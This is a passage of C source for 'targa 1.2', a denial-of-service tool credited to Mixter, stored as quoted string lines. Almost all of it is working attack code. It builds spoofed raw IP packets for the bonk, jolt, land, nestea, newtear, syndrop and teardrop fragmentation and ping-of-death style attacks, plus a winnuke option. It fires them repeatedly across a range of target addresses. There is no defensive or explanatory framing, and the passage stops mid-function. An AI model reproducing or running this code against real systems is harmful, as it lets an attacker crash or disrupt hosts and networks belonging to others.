            "#define BONKREP 15\t\t/* repeat bonk attack x times */",
            "#define COUNT   0x15\t\t/* repeat frag attacks x times */",
            "#define NESCOUNT  200\t\t/* repeat nestea attack x times */",
            "#define WNUKEPORT 139\t\t/* port for winnukes */",
            "#define WNUKEREP 0\t\t/* repeat winnuke x times */",
            "#define __FAVOR_BSD\t\t/* for newer linux */",
            "#define TH_SYN 0x02\t\t/* for lame includes */",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <time.h>",
            "#include <unistd.h>",
            "#include <arpa/inet.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#include <netinet/tcp.h>",
            "#include <netinet/udp.h>",
            "#include <netinet/udp.h>",
            "#include <sys/socket.h>",
            "#include <sys/time.h>",
            "#include <sys/types.h>",
            "#define FIX(n)  htons(n)\t/* define this to (n), if using BSD */",
            "#define IPH     0x14\t\t/* IP header size */",
            "#define UDPH    0x8\t\t/* UDP header size */",
            "#define IP_MF   0x2000\t\t/* Fragmention offset */",
            "#define MAGIC   0x3\t\t/* Teardrop Magic fragmentation constant (tm) */",
            "#define MAGIC2  108\t\t/* Nestea Magic fragmentation constant (tm) */",
            "#define NESPADDING 256\t\t/* Padding for Nestea */",
            "#define PADDING 0x14\t\t/* Padding for other frag's */",
            "#define TCPH    sizeof(struct tcphdr)\t/* TCP header size (nestea) */",
            "#define TPADDING 0x1c\t\t/* Padding for original teardrop */",
            "/* main() - user interface & some functions */",
            "struct ipstuph",
            "    int p1;",
            "    int p2;",
            "    int p3;",
            "    int p4;",
            "startip, endip;",
            "void targa (u_char *);",
            "u_long leet_resolve (u_char *);",
            "u_short in_cksum (u_short *, int);",
            "int ",
            "main (int argc, char **argv)",
            "  int one = 1, count = 1, i, j, rip_sock, bequiet = 0, dostype = 0;",
            "  u_long src_ip = 0;",
            "  u_short src_prt = 0, dst_prt = 0;",
            "  char hit_ip[18], dst_ip2[18], dst_ip[4096];",
            "  struct in_addr addr;",
            "  fprintf (stderr, \"\\t\\t",
            "[0;33mtarga 1.2 by ",
            "[1;33m",
            "[5mMixter",
            "[0m\\n\");",
            "  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "      perror (\"cannot open raw socket\");",
            "      exit (1);",
            "    }",
            "  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one))",
            "      < 0)",
            "    {",
            "      perror (\"IP_HDRINCL\");",
            "      exit (1);",
            "    }",
            "  if ((argv[1]==\"-help\")||(argv[1]==\"--help\")||(argv[1]==\"-h\")||(argv[1]==\"--h\")) targa_help(argv[0]);",
            "  if (argc < 3) if (argc < 2) targa(argv[0]);",
            "  strncpy (dst_ip, argv[1], 4096);",
            "  if (argc == 2 ) { strncpy (dst_ip2, argv[1], 18); } else {",
            "\t\t\t\tstrncpy (dst_ip2, argv[2], 18); } ",
            "    if (sscanf (dst_ip, \"%d.%d.%d.%d\", &startip.p1, &startip.p2, &startip.p3, &startip.p4) != 4)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Error, %s: Please use a start IP containing 4 zones\\n\", argv[1]);",
            "      exit (1);",
            "    }",
            "  if (startip.p1 > 255)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 1 of start ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (startip.p2 > 255)",
            "    {",
            "     targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 2 of start ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (startip.p3 > 255)",
            "    {",
            "     targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 3 of start ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (startip.p4 > 255)",
            "    {",
            "     targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 4 of start ip is incorret (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (sscanf (dst_ip2, \"%d.%d.%d.%d\", &endip.p1, &endip.p2, &endip.p3, &endip.p4) != 4)",
            "    {",
            "     targa_help (argv[0]);",
            "      fprintf (stderr, \"Error, %s: Please use an end IP containing 4 zones\\n\", argv[2]);",
            "      exit (1);",
            "    }",
            "  if (endip.p1 > 255)",
            "    {",
            "     targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 1 of end ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (endip.p2 > 255)",
            "    {",
            "     targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 2 of end ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (endip.p3 > 255)",
            "    {",
            "     targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 3 of end ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (endip.p4 > 255)",
            "    {",
            "     targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 4 of end ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (startip.p1 != endip.p1)",
            "    {",
            "     targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 1 of start ip and end ip is different",
            "[0m\\n\");",
            "      exit (1);",
            "    }",
            "  if (startip.p2 != endip.p2)",
            "    {",
            "     targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 2 of start ip and end ip is different\\n\");",
            "      exit (1);",
            "    }",
            "  if (startip.p3 != endip.p3)",
            "    {",
            "     targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 3 of start ip and end ip is different\\n\");",
            "      exit (1);",
            "    }",
            "  while ((i = getopt_long (argc, argv, \"t:n:h\")) != EOF)",
            "    {",
            "      switch (i)",
            "\tcase 't':",
            "\t  dostype = atoi (optarg);\t/* type of DOS */",
            "\t  break;",
            "\tcase 'n':\t\t/* number to send */",
            "\t  count = atoi (optarg);",
            "\t  break;",
            "\tcase 'h':\t\t/* quiet mode */",
            "\t  targa_help (argv[0]);",
            "\t  break;",
            "\tdefault:",
            "\t  targa (argv[0]);",
            "\t  break;\t\t/* NOTREACHED */",
            "    }",
            "  srandom ((unsigned) (time ((time_t) 0)));",
            "  fprintf (stderr, \"",
            "[1;31mLeet",
            "[0;31mness on f",
            "[1;31mlaxen wing",
            "[0;31ms",
            "[0m:\\n\");",
            "  fprintf (stderr, \"",
            "[1;31mTo",
            "[0m: ",
            "[0;31m%s - %s",
            "[0m\\n\", dst_ip,",
            "\t   dst_ip2);",
            "  fprintf (stderr, \"",
            "[1;31mRepeats",
            "[0m: ",
            "[0;31m%5d",
            "[0m\\n\", count);",
            "  fprintf (stderr, \"",
            "[1;31m   Type",
            "[0m: ",
            "[0;31m%5d",
            "[0m\\n\", dostype);",
            "  for (j = startip.p4; j <= endip.p4; j++)",
            "    {",
            "      sprintf (hit_ip, \"%d.%d.%d.%d\", startip.p1, startip.p2, startip.p3, j);",
            "      fprintf (stderr, \"",
            "[0;31m%s ",
            "[1;31m[ ",
            "[0m\", hit_ip);",
            "      for (i = 0; i < count; i++)",
            "\t  hax0r (hit_ip, dostype);",
            "      fprintf (stderr, \"",
            "[0;31m ]",
            "[0m\\n\");",
            "    }",
            "  fprintf (stderr, \"\\t",
            "[1;31m-all done-",
            "[0m\\n\");",
            "  return (0);",
            "int ",
            "hax0r (char *vm, int te)",
            "/* beginning of hardcoded ereetness :P */",
            "  if (te == 1 || te == 0)",
            "    bonk (vm);",
            "  if (te == 2 || te == 0)",
            "    jolt (vm);",
            "  if (te == 3 || te == 0)",
            "    land (vm);",
            "  if (te == 4 || te == 0)",
            "    nestea (vm);",
            "  if (te == 5 || te == 0)",
            "    newtear (vm);",
            "  if (te == 6 || te == 0)",
            "    syndrop (vm);",
            "  if (te == 7 || te == 0)",
            "    teardrop (vm);",
            "  if (te == 8 || te == 0)",
            "    winnuke (vm);",
            "  return (31337);",
            "u_long ",
            "leet_resolve (u_char * host_name)",
            "  struct in_addr addr;",
            "  struct hostent *host_ent;",
            "  if ((addr.s_addr = inet_addr (host_name)) == -1)",
            "    {",
            "      if (!(host_ent = gethostbyname (host_name)))",
            "\treturn (0);",
            "      bcopy (host_ent->h_addr, (char *) &addr.s_addr, host_ent->h_length);",
            "    }",
            "  return (addr.s_addr);",
            "void ",
            "targa (u_char * name)",
            "  fprintf (stderr, \"",
            "[0;31musage: %s <startIP> <endIP> [-t type] [-n repeats]",
            "[0m\\n\", name);",
            "  exit (0);",
            "int ",
            "targa_help (u_char * name)",
            "  fprintf (stderr, \"",
            "[0;31musage: %s <startIP> <endIP> [-t type] [-n repeats]\\n\", name);",
            "  fprintf (stderr, \"startIP - endIP: ",
            "[1;31mIP range to send packets to (destination)\\n\");",
            "  fprintf (stderr, \"",
            "[0;31mstart and end must be on the same C class (1.1.1.X)\\n\");",
            "  fprintf (stderr, \"repeats: ",
            "[1;31mrepeat the whole cycle n times (default is 1)\\n\");",
            "  fprintf (stderr, \"",
            "[0;31mtype: ",
            "[1;31mkind of remote DoS to send (default is 0)\\n\");",
            "  fprintf (stderr, \"",
            "[0;31m1 = bonk (",
            "[1;31m$",
            "[0;31m)  2 = jolt (",
            "[1;32m@",
            "[0;31m)  3 = land (",
            "[1;33m-",
            "[0;31m)\\n\");",
            "  fprintf (stderr, \"4 = nestea (",
            "[1;34m.",
            "[0;31m)  5 = newtear (",
            "[1;32m#",
            "[0;31m)\\n\");",
            "  fprintf (stderr, \"6 = syndrop (",
            "[1;35m&",
            "[0;31m)  7 = teardrop (",
            "[1;34m%%",
            "[0;31m)  8 = winnuke (",
            "[1;37m*",
            "[0;31m)\\n\");",
            "  fprintf (stderr, \"",
            "[0;31m0 = use all remote DoS types at once\\n",
            "[0m\");",
            "  exit (0);",
            "/* bonk(destination) */",
            "struct udp_pkt",
            "  struct iphdr ip;",
            "  struct udphdr udp;",
            "  char data[0x1c];",
            "pkt;",
            "int udplen = sizeof (struct udphdr), iplen = sizeof (struct iphdr), datalen = 100,",
            "  psize = sizeof (struct udphdr) + sizeof (struct iphdr) + 0x1c, spf_sck;\t/* Socket */",
            "u_long ",
            "host_to_ip (char *host_name)",
            "  static u_long ip_bytes;",
            "  struct hostent *res;",
            "  res = gethostbyname (host_name);",
            "  if (res == NULL)",
            "    return (0);",
            "  memcpy (&ip_bytes, res->h_addr, res->h_length);",
            "  return (ip_bytes);",
            "void ",
            "quit (char *reason)",
            "  perror (reason);",
            "  close (spf_sck);",
            "  exit (-1);",
            "int ",
            "fondle (int sck, u_long src_addr, u_long dst_addr, int src_prt,",
            "\tint dst_prt)",
            "  int bs;",
            "  struct sockaddr_in to;",
            "  memset (&pkt, 0, psize);",
            "  /* Fill in ip header */",
            "  pkt.ip.version = 4;",
            "  pkt.ip.ihl = 5;",
            "  pkt.ip.tot_len = htons (udplen + iplen + 0x1c);",
            "  pkt.ip.id = htons (0x455);",
            "  pkt.ip.ttl = 255;",
            "  pkt.ip.protocol = IPPROTO_UDP;",
            "  pkt.ip.saddr = src_addr;",
            "  pkt.ip.daddr = dst_addr;",
            "  pkt.ip.frag_off = htons (0x2000);\t/* more to come */",
            "  pkt.udp.source = htons (src_prt);\t/* udp header */",
            "  pkt.udp.dest = htons (dst_prt);",
            "  pkt.udp.len = htons (8 + 0x1c);",
            "  /* send 1st frag */",
            "  to.sin_family = AF_INET;",
            "  to.sin_port = src_prt;",
            "  to.sin_addr.s_addr = dst_addr;",
            "  bs = sendto (sck, &pkt, psize, 0, (struct sockaddr *) &to,",
            "\t       sizeof (struct sockaddr));",
            "  pkt.ip.frag_off = htons (0x3 + 1);\t/* shinanigan */",
            "  pkt.ip.tot_len = htons (iplen + 0x3);",
            "  /* 2nd frag */",
            "  bs = sendto (sck, &pkt, iplen + 0x3 + 1, 0,",
            "\t       (struct sockaddr *) &to, sizeof (struct sockaddr));",
            "  return bs;",
            "int ",
            "bonk (char *bonk_host)",
            "  u_long src_addr, dst_addr;",
            "  int i, src_prt = 53, dst_prt = 53, bs = 1, pkt_count = BONKREP;",
            "  dst_addr = host_to_ip (bonk_host);",
            "  if (!dst_addr)",
            "    quit (\"bad target host\");",
            "  spf_sck = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "  if (!spf_sck)",
            "    quit (\"socket()\");",
            "  if (setsockopt (spf_sck, IPPROTO_IP, IP_HDRINCL, (char *) &bs,",
            "\t\t  sizeof (bs)) < 0)",
            "    quit (\"IP_HDRINCL\");",
            "  for (i = 0; i < pkt_count; ++i)",
            "    {",
            "      fondle (spf_sck, rand (), dst_addr, src_prt, dst_prt);",
            "      fprintf (stderr, \"",
            "[1;31m$",
            "[0m\");",
            "    }",
            "/* jolt(destination) */",
            "int ",
            "jolt (char *jolt_host)",
            "  int s, i;",
            "  char buf[400];",
            "  struct ip *ip = (struct ip *) buf;",
            "  struct icmphdr *icmp = (struct icmphdr *) (ip + 1);",
            "  struct hostent *hp, *hp2;",
            "  struct sockaddr_in dst;",
            "  int offset;",
            "  int on = 1;",
            "  int num = JOLTREP;",
            "  bzero (buf, sizeof buf);",
            "  if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "      perror (\"socket\");",
            "      exit (1);",
            "    }",
            "  if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, &on, sizeof (on)) < 0)",
            "    {",
            "      perror (\"IP_HDRINCL\");",
            "      exit (1);",
            "    }",
            "  for (i = 1; i <= num; i++)",
            "    {",
            "      if ((hp = gethostbyname (jolt_host)) == NULL)",
            "\t  if ((ip->ip_dst.s_addr = inet_addr (jolt_host)) == -1)",
            "\t    {",
            "\t      fprintf (stderr, \"%s: unknown host\\n\", jolt_host);",
            "\t      exit (1);",
            "\t    }",
            "      else",
            "\t  bcopy (hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);",
            "      ip->ip_src.s_addr = rand ();",
            "      fprintf (stderr, \"",
            "[1;32m@",
            "[0m\");",
            "      inet_ntoa (ip->ip_dst);",
            "      ip->ip_v = 4;",
            "      ip->ip_hl = sizeof *ip >> 2;",
            "      ip->ip_tos = 0;",
            "      ip->ip_len = htons (sizeof buf);",
            "      ip->ip_id = htons (4321);",
            "      ip->ip_off = htons (0);",
            "      ip->ip_ttl = 255;",
            "      ip->ip_p = 1;",
            "      dst.sin_addr = ip->ip_dst;",
            "      dst.sin_family = AF_INET;",
            "      icmp->type = ICMP_ECHO;",
            "      icmp->code = 0;",
            "      icmp->checksum = htons (~(ICMP_ECHO << 8));",
            "      for (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip))",
            "\t  ip->ip_off = htons (offset >> 3);",
            "\t  if (offset < 65120)",
            "\t    ip->ip_off |= htons (0x2000);",
            "\t  else",
            "\t    ip->ip_len = htons (418);\t/* make total 65538 */",
            "\t  if (sendto (s, buf, sizeof buf, 0, (struct sockaddr *) &dst,",
            "\t\t      sizeof dst) < 0)",
            "\t    {",
            "\t      fprintf (stderr, \"offset %d: \", offset);",
            "\t      perror (\"sendto\");",
            "\t    }",
            "\t  if (offset == 0)",
            "\t    {",
            "\t      icmp->type = 0;",
            "\t      icmp->code = 0;",
            "\t      icmp->checksum = 0;",
            "\t    }",
            "    }",
            "  return 0;",
            "/* land(destination,port) */",
            "typedef\tu_long\ttcp_seq;",
            "struct tcxhdr {",
            "\tu_short\tth_sport;\t",
            "\tu_short\tth_dport;\t",
            "\ttcp_seq\tth_seq;\t\t",
            "\ttcp_seq\tth_ack;\t\t",
            "#if __BYTE_ORDER == __LITTLE_ENDIAN",
            "        u_char  th_x2:4,               ",
            "                th_off:4;              ",
            "#endif",
            "#if __BYTE_ORDER == __BIG_ENDIAN",
            "        u_char  th_off:4,              ",
            "                th_x2:4;                ",
            "#endif",
            "\tu_char\tth_flags;",
            "\tu_short\tth_win;\t",
            "\tu_short\tth_sum;\t",
            "\tu_short\tth_urp;\t",
            "struct pseudohdr",
            "  struct in_addr saddr;",
            "  struct in_addr daddr;",
            "  u_char zero;",
            "  u_char protocol;",
            "  u_short length;",
            "  struct tcxhdr tcpheader;",
            "u_short ",
            "checksum (u_short * data, u_short length)",
            "  register long value;",
            "  u_short i;",
            "  for (i = 0; i < (length >> 1); i++)",
            "    value += data[i];",
            "  if ((length & 1) == 1)",
            "    value += (data[i] << 8);",
            "  value = (value & 65535) + (value >> 16);",
            "  return (~value);",
            "int ",
            "land (char *land_host)",
            "  struct sockaddr_in sin;",
            "  struct hostent *hoste;",
            "  int sock, i;",
            "  char buffer[40];",
            "  struct iphdr *ipheader = (struct iphdr *) buffer;",
            "  struct tcxhdr *tcpheader = (struct tcxhdr *) (buffer + sizeof (struct iphdr));",
            "  struct pseudohdr pseudoheader;",
            "  static char *land_port = LANDPORT;",
            "  bzero (&sin, sizeof (struct sockaddr_in));",
            "  sin.sin_family = AF_INET;",
            "  if ((hoste = gethostbyname (land_host)) != NULL)",
            "    bcopy (hoste->h_addr, &sin.sin_addr, hoste->h_length);",
            "  else if ((sin.sin_addr.s_addr = inet_addr (land_host)) == -1)",
            "    {",
            "      fprintf (stderr, \"unknown host %s\\n\", land_host);",
            "      return (-1);",
            "    }",
            "  if ((sin.sin_port = htons (atoi (land_port))) == 0) return(-1);",
            "  if ((sock = socket (AF_INET, SOCK_RAW, 255)) == -1) return(-1);",
            "  bzero (&buffer, sizeof (struct iphdr) + sizeof (struct tcxhdr));",
            "  ipheader->version = 4;",
            "  ipheader->ihl = sizeof (struct iphdr) / 4;",
            "  ipheader->tot_len = htons (sizeof (struct iphdr) + sizeof (struct tcxhdr));",
            "  ipheader->id = htons (0xF1C);",
            "  ipheader->ttl = 255;",
            "  ipheader->protocol = IPPROTO_TCP;",
            "  ipheader->saddr = sin.sin_addr.s_addr;",
            "  ipheader->daddr = sin.sin_addr.s_addr;",
            "  tcpheader->th_sport = sin.sin_port;",
            "  tcpheader->th_dport = sin.sin_port;",
            "  tcpheader->th_seq = htonl (0xF1C);",
            "  tcpheader->th_flags = TH_SYN;",
            "  tcpheader->th_off = sizeof (struct tcxhdr) / 4;",
            "  tcpheader->th_win = htons (2048);",
            "  bzero (&pseudoheader, 12 + sizeof (struct tcxhdr));",
            "  pseudoheader.saddr.s_addr = sin.sin_addr.s_addr;",
            "  pseudoheader.daddr.s_addr = sin.sin_addr.s_addr;",
            "  pseudoheader.protocol = 6;",
            "  pseudoheader.length = htons (sizeof (struct tcxhdr));",
            "  bcopy ((char *) tcpheader, (char *) &pseudoheader.tcpheader, sizeof (struct tcxhdr));",
            "  tcpheader->th_sum = checksum ((u_short *) & pseudoheader, 12 + sizeof (struct tcxhdr));",
            "  for (i = 0; i < LANDREP; i++)",
            "    {",
            "      if (sendto (sock, buffer, sizeof (struct iphdr) + sizeof (struct tcxhdr), 0, (struct sockaddr *) &sin, sizeof (struct sockaddr_in)) == -1)",
            "\t  fprintf (stderr, \"couldn't send packet\\n\");",
            "\t  return (-1);",
            "      fprintf (stderr, \"",
            "[1;33m-",
            "[0m\");",
            "    }",
            "  close (sock);",
            "  return (0);",
            "/* nestea(source, destination) */",
            "u_long name_resolve (u_char *);",
            "u_short in_cksum (u_short *, int);",
            "void send_nes (int, u_long, u_long, u_short, u_short);",
            "int ",
            "nestea (char *nes_host)",
            "  int one = 1, count = 0, i, rip_sock;",
            "  u_long src_ip = 0, dst_ip = 0;",
            "  u_short src_prt = 0, dst_prt = 0;",
            "  struct in_addr addr;",
            "  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "      perror (\"raw socket\");",
            "      exit (1);",
            "    }",
            "  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one))",
            "      < 0)",
            "    {",
            "      perror (\"IP_HDRINCL\");",
            "      exit (1);",
            "    }",
            "  if (!(dst_ip = name_resolve (nes_host)))",
            "    {",
            "      fprintf (stderr, \"What the hell kind of IP address is that?\\n\");",
            "      exit (1);",
            "    }",
            "  src_ip = rand ();",
            "  srandom ((unsigned) (time ((time_t) 0)));",
            "  src_prt = (random () % 0xffff);",
            "  dst_prt = (random () % 0xffff);",
            "  count = NESCOUNT;",
            "  addr.s_addr = src_ip;",
            "  addr.s_addr = dst_ip;",
            "  for (i = 0; i < count; i++)",
            "    {",
            "      send_nes (rip_sock, src_ip, dst_ip, src_prt, dst_prt);",
            "      fprintf (stderr, \"",
            "[1;34m.",
            "[0m\");",
            "    }",
            "  return (0);",
            "void ",
            "send_nes (int sock, u_long src_ip, u_long dst_ip, u_short src_prt,",
            "\t  u_short dst_prt)",
            "  int i;",
            "  u_char *packet = NULL, *p_ptr = NULL;\t\t/* packet pointers */",
            "  u_char byte;\t\t\t/* a byte */",
            "  struct sockaddr_in sin;\t/* socket protocol structure */",
            "  sin.sin_family = AF_INET;",
            "  sin.sin_port = src_prt;",
            "  sin.sin_addr.s_addr = dst_ip;",
            "  packet = (u_char *) malloc (IPH + UDPH + NESPADDING + 40);",
            "  p_ptr = packet;",
            "  bzero ((u_char *) p_ptr, IPH + UDPH + NESPADDING);",
            "  byte = 0x45;\t\t\t/* IP version and header length */",
            "  memcpy (p_ptr, &byte, sizeof (u_char));",
            "  p_ptr += 2;\t\t\t/* IP TOS (skipped) */",
            "  *((u_short *) p_ptr) = FIX (IPH + UDPH + 10);\t\t/* total length */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (242);\t/* IP id */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) |= FIX (IP_MF);\t/* IP frag flags and offset */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0x40;\t/* IP TTL */",
            "  byte = IPPROTO_UDP;",
            "  memcpy (p_ptr + 1, &byte, sizeof (u_char));",
            "  p_ptr += 4;\t\t\t/* IP checksum filled in by kernel */",
            "  *((u_long *) p_ptr) = src_ip;\t/* IP source address */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = dst_ip;\t/* IP destination address */",
            "  p_ptr += 4;",
            "  *((u_short *) p_ptr) = htons (src_prt);\t/* UDP source port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (dst_prt);\t/* UDP destination port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (8 + 10);\t/* UDP total length */",
            "  if (sendto (sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  p_ptr = packet;",
            "  bzero ((u_char *) p_ptr, IPH + UDPH + NESPADDING);",
            "  byte = 0x45;\t\t\t/* IP version and header length */",
            "  memcpy (p_ptr, &byte, sizeof (u_char));",
            "  p_ptr += 2;\t\t\t/* IP TOS (skipped) */",
            "  *((u_short *) p_ptr) = FIX (IPH + UDPH + MAGIC2);\t/* total length */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (242);\t/* IP id */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = FIX (6);\t/* IP frag flags and offset */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0x40;\t/* IP TTL */",
            "  byte = IPPROTO_UDP;",
            "  memcpy (p_ptr + 1, &byte, sizeof (u_char));",
            "  p_ptr += 4;\t\t\t/* IP checksum filled in by kernel */",
            "  *((u_long *) p_ptr) = src_ip;\t/* IP source address */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = dst_ip;\t/* IP destination address */",
            "  p_ptr += 4;",
            "  *((u_short *) p_ptr) = htons (src_prt);\t/* UDP source port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (dst_prt);\t/* UDP destination port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (8 + MAGIC2);\t/* UDP total length */",
            "  if (sendto (sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  p_ptr = packet;",
            "  bzero ((u_char *) p_ptr, IPH + UDPH + NESPADDING + 40);",
            "  byte = 0x4F;\t\t\t/* IP version and header length */",
            "  memcpy (p_ptr, &byte, sizeof (u_char));",
            "  p_ptr += 2;\t\t\t/* IP TOS (skipped) */",
            "  *((u_short *) p_ptr) = FIX (IPH + UDPH + NESPADDING + 40);",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (242);\t/* IP id */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0 | FIX (IP_MF);\t/* IP frag flags and offset */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0x40;\t/* IP TTL */",
            "  byte = IPPROTO_UDP;",
            "  memcpy (p_ptr + 1, &byte, sizeof (u_char));",
            "  p_ptr += 4;\t\t\t/* IP checksum filled in by kernel */",
            "  *((u_long *) p_ptr) = src_ip;\t/* IP source address */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = dst_ip;\t/* IP destination address */",
            "  p_ptr += 44;",
            "  *((u_short *) p_ptr) = htons (src_prt);\t/* UDP source port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (dst_prt);\t/* UDP destination port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (8 + NESPADDING);\t/* UDP total length */",
            "  for (i = 0; i < NESPADDING; i++)",
            "    {",
            "      p_ptr[i++] = random () % 255;",
            "    }",
            "  if (sendto (sock, packet, IPH + UDPH + NESPADDING, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  free (packet);",
            "u_long ",
            "name_resolve (u_char * host_name)",
            "  struct in_addr addr;",
            "  struct hostent *host_ent;",
            "  if ((addr.s_addr = inet_addr (host_name)) == -1)",
            "    {",
            "      if (!(host_ent = gethostbyname (host_name)))",
            "\treturn (0);",
            "      bcopy (host_ent->h_addr, (char *) &addr.s_addr, host_ent->h_length);",
            "    }",
            "  return (addr.s_addr);",
            "/* newtear(destination) */",
            "void newt_frags (int, u_long, u_long, u_short, u_short);",
            "int ",
            "newtear (char *newt_host)",
            "  int one = 1, count = 0, i, rip_sock;",
            "  u_long src_ip = 0, dst_ip = 0;",
            "  u_short src_prt = 0, dst_prt = 0;",
            "  struct in_addr addr;",
            "  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "      perror (\"raw socket\");",
            "      exit (1);",
            "    }",
            "  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one))",
            "      < 0)",
            "    {",
            "      perror (\"IP_HDRINCL\");",
            "      exit (1);",
            "    }",
            "  if (!(dst_ip = name_resolve (newt_host)))",
            "    {",
            "      fprintf (stderr, \"What the hell kind of IP address is that?\\n\");",
            "      exit (1);",
            "    }",
            "  src_ip = rand ();",
            "  srandom ((unsigned) (time ((time_t) 0)));",
            "  src_prt = (random () % 0xffff);",
            "  dst_prt = (random () % 0xffff);",
            "  count = COUNT;",
            "  addr.s_addr = src_ip;",
            "  addr.s_addr = dst_ip;",
            "  for (i = 0; i < count; i++)",
            "    {",
            "      newt_frags (rip_sock, src_ip, dst_ip, src_prt, dst_prt);",
            "      fprintf (stderr, \"",
            "[1;32m#",
            "[0m\");",
            "    }",
            "  return (0);",
            " *  Send two IP fragments with pathological offsets.  We use an implementation",
            " *  independent way of assembling network packets that does not rely on any of",
            " *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).",
            "void ",
            "newt_frags (int sock, u_long src_ip, u_long dst_ip, u_short src_prt,",
            "\t    u_short dst_prt)",
            "  u_char *packet = NULL, *p_ptr = NULL;\t\t/* packet pointers */",
            "  u_char byte;\t\t\t/* a byte */",
            "  struct sockaddr_in sin;\t/* socket protocol structure */",
            "  sin.sin_family = AF_INET;",
            "  sin.sin_port = src_prt;",
            "  sin.sin_addr.s_addr = dst_ip;",
            "  /*",
            "   * Grab some memory for our packet, align p_ptr to point at the beginning",
            "   * of our packet, and then fill it with zeros.",
            "   */",
            "  packet = (u_char *) malloc (IPH + UDPH + PADDING);",
            "  p_ptr = packet;",
            "  bzero ((u_char *) p_ptr, IPH + UDPH + PADDING);\t// Set it all to zero",
            "  byte = 0x45;\t\t\t/* IP version and header length */",
            "  memcpy (p_ptr, &byte, sizeof (u_char));",
            "  p_ptr += 2;\t\t\t/* IP TOS (skipped) */",
            "  *((u_short *) p_ptr) = FIX (IPH + UDPH + PADDING);\t/* total length */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (242);\t/* IP id */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) |= FIX (IP_MF);\t/* IP frag flags and offset */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0x40;\t/* IP TTL */",
            "  byte = IPPROTO_UDP;",
            "  memcpy (p_ptr + 1, &byte, sizeof (u_char));",
            "  p_ptr += 4;\t\t\t/* IP checksum filled in by kernel */",
            "  *((u_long *) p_ptr) = src_ip;\t/* IP source address */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = dst_ip;\t/* IP destination address */",
            "  p_ptr += 4;",
            "  *((u_short *) p_ptr) = htons (src_prt);\t/* UDP source port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (dst_prt);\t/* UDP destination port */",
            "  p_ptr += 2;",
